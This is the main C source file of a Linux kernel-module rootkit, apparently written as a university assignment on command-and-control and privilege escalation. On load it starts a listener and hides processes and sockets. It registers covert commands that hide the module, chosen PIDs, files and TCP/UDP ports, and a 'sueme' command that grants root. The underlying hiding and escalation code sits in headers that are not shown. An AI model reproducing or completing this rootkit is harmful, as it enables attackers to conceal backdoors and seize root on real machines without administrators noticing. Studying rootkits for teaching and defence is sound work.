#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */

#include "file_hiding.h"
#include "code_hiding.h"
#include "process_hiding.h"
#include "socket_hiding.h"
#include "commands.h"
#include "privilege_escalation.h"
#include "sysmap.h"

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 7 - Command and Control & Privilege Escalation"

static int __init mod_init(void)
{
  listen();
  hide_processes();
  hide_sockets();
  add_command("hideme", NOARG, hide_code); //hide module
  add_command("unhideme", NOARG, unhide_code); //show module
  add_command("hidepid", INTLST, hide_process); //hide pid
  add_command("unhidepc", NOARG, unhide_processes); //show process
  add_command("hidefile", NOARG, hide_files); //hide files
  add_command("unhidef", NOARG, unhide_files); //show files
  add_command("sockhtcp", INTLST, hide_port_tcp); //hide tcp socket
  add_command("sockhudp", INTLST, hide_port_udp); //hide udp socket
  add_command("sueme", NOARG, root_me); //privilege escalation
  printk(KERN_INFO "mod_init\n");
  return 0;
}

static void __exit mod_exit(void)
{
  stop_listen();
  unhide_processes();
  unhide_sockets();
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");

